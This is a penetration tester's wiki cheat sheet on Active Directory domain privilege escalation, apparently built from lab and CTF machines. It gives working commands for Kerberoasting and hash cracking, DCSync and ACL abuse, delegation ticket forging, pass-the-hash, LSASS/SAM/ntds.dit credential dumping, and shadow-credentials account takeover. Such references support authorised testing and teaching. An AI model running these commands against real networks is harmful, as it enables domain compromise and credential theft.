---
layout: wiki
title: Domain Privilege Escalation
cate1: Internals
cate2: Step 4
description: Domain Privilege Escalation
keywords: Internals
---

# Domain Privilege Escalation

## Kerberoasting
**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**

**Requires:** Domain Credentials

**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.

```
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## WriteDACL
**[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**

## Active Directory ACLs/ACEs
**[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**

## NTLMRelay
**[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**

## DCSync
**[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**

**With PowerView**:
```
whoami /all
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
net group "Exchange Windows Permissions" /add svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
Get-DomainUser -Identity svc-alfresco
Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
```

## SYSVOL Group Policy Credential Mining
**[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**

## Constrained Delegation
**[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**

```
Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
Rubeus.exe ptt /ticket:test.kirbi (import ticket)
Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)


**For Linux use:**
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py cifs.kirbi cifs.ccache
export KRB5CCNAME=cifs.ccache
sudo apt-get install krb5-user

OR

getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
```

**What if we have delegation rights for only a spesific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

**Additional Resources**
  - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)

## ForceChangePassword
**[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)**

**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object

```
net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred (optional $Cred)
```

**Additional Resources**
  - [BloodHound ForceChangePassword](https://support.bloodhoundenterprise.io/hc/en-us/articles/17223286750747-ForceChangePassword)

## Pass The Hash
**[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
```
evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
  - Sometimes you can compromise the WinRM, and then create a new administrator account to psexec into to access domain.
```

## SeDebugPrivilege Add New Administrative User
**[SeDebugPrivilege Add New Administrative User](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)**

## Credential Dumping
**[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**

**Requires:** Credential Guard to be disabled.

```
Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
```

**[Dumping Local SAM](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)**
  - Crack SAM hashes: https://sanjumalhotra26.medium.com/dumping-credentials-from-sam-file-using-mimikatz-and-cracking-with-john-the-ripper-and-hashcat-ce5bbf2f4f5a

**[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)**

**Requires:** A DMP file containing credentials extracted to our Linux machine.
```
pypykatz lsa minidump lsass.DMP
```

## Abusing Backup Operators Group

**Requires:** User account that is member of the Backup Operators group
**Achieves:** Extract ntds.dit, dump hashes to escalate privileges to Domain Admin

**[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**

```
whoami /all (SeBackupPrivilege Enabled)

diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
reg save hklm\system c:\temp\system.bak (System Hive keys)
```
**Additional Resources**
  -  [Windows Privilege Escalation with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58)

## Shadow Credentials (msDS-KeyCredentialLink | AddKeyCredentialLink)

### Understanding PKINIT (Public Key Cryptography for Initial Authentication)
*Credits to SpecterOps [link here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)*

In Kerberos authentication, clients must perform "pre-authentication" before the KDC provides them with a Ticket Granting Ticket (TGT), which can subsequently be used to obtain Service Tickets. The reason for pre-authentication is that without it, anyone could obtain a blob encrypted with a key derived from the client’s password and try to crack it offline, as done in the AS-REP Roasting Attack.

The client performs pre-authentication by encrypting a timestamp with their credentials to prove to the KDC that they have the credentials for the account. This is usually done via a symmetric key approach, derived from the client’s password, AKA secret key. If using RC4 encryption, this key would be the NT hash of the client’s password. The KDC has a copy of the client’s secret key and can decrypt the pre-authentication data to authenticate the client. The KDC uses the same key to encrypt a session key sent to the client along with the TGT.

PKINIT is the less common, asymmetric key (public key) approach. The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. This requires an exchange of certificates using a Certificate Authority which they both trust, through a method known as the Certificate Trust model.

A new concept introduced in Windows Server 2016 allowed for Key Trusts that support passwordless authentication. The client’s public key is stored in a multi-value attribute called `msDS-KeyCredentialLink`. The values of this attribute are Key Credentials, which are serialized objects containing information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and, of course, the public key.

![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/02de8c83-70fc-4ae3-a294-fcee6b2d22e6)

### Windows Hello Enrollment

When a user enrolls, the TPM (Trusted Platform Module) generates a public-private key pair for the user’s account — the private key should never leave the TPM. Next, if the Certificate Trust model is implemented in the organization, the client issues a certificate request to obtain a trusted certificate from the environment’s certificate issuing authority for the TPM-generated key pair. 

![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/69e08f9d-f2ba-45f8-84e8-805d6b85052d)

However, if the Key Trust model is implemented, the public key is stored in a new Key Credential object in the msDS-KeyCredentialLink attribute of the account. The private key is protected by a PIN code, which Windows Hello allows replacing with a biometric authentication factor, such as fingerprint or face recognition.

### msDS-KeyCredentialLink
In essence, the `msDS-KeyCredentialLink` attribute is part of the implementation for Windows Hello for Business and other key-based authentication mechanisms in Active Directory (AD). It is used to store public key credentials for an Active Directory object, typically a user or a device. This attribute enables passwordless authentication methods, such as biometrics (e.g., fingerprint or facial recognition) and PINs, by linking them to the user or device's AD account.

This means that if you can write to the msDS-KeyCredentialLink property of a user, you can obtain a TGT for that user. If there is a relationship between Domain Users or Computer accounts that allow `AddKeyCredentialLink`, it may be possible to takeover that user or object. It is also possible to obtain the NTLM hash of the user

### Shadow Credentials
When abusing Key Trust, we are effectively adding alternative credentials to the account, or “Shadow Credentials”, allowing for obtaining a TGT and subsequently the NTLM hash for the user/computer. Those Shadow Credentials would persist even if the user/computer changed their password.

### Exploitation
Use [pywhisker for Linux](https://github.com/ShutdownRepo/pywhisker) or [Whisker for Windows](https://github.com/eladshamir/Whisker) to abuse.

Can use `add` to generate a new public/private key pair and add it to the `msDS-KeyCredentialLink` property. Also keep in mind that it might be useful to use the `remove` for cleanup.

```
python3 pywhisker.py -d "zsm.local" -u "marcus" -p "\!QAZ2wsx" -t "ZPH-SVRMGMT1$" --action "add" -v 
```

Clone the [PKINITtools](https://github.com/dirkjanm/PKINITtools) repository for utilities to generate a TGT

```
python3 PKINITtools/gettgtpkinit.py -cert-pfx UvWSLQEU.pfx -pfx-pass uq1SMyetoBSAUdZxTpOH zsm.local/ZPH-SVRMGMT1$ UvWSLQEU.ccache (Retrieve TGT)
python3 PKINITtools/getnthash.py -key f1969ba89e75d5893b06b1bf946e08d336ca04d82152f69fa2882021ce214172 -dc-ip 192.168.210.10 zsm.local/ZPH-SVRMGMT1$ (Recover NT hash)

getST.py -k -no-pass ZPH-SVRMGMT1\$@192.168.210.11 -spn CIFS/ZPH-SVRMGMT1.ZSM.LOCAL -debug -dc-ip 192.168.210.10 (Retrieve CIFS TGT ticket)

smbclient.py -k -no-pass ZPH-SVRMGMT1.ZSM.LOCAL -debug
```

**Additional Resources**
  - [Shadow Credentials - Computer Account Take Over](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials#computer-account-take-over)
  - [SpectreOps - Shadow Credentials Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
  - [The Hacker Recipes - ACE Abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
  - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)
